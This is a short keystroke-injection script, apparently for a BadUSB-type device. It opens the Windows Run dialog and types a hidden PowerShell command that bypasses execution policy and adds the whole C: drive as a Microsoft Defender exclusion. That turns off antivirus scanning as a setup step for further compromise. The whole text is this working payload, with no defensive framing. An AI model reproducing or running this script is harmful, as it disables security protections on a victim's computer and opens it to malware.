

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C Add-MpPreference -ExclusionPath C:/");
delay(500);
press("ENTER");
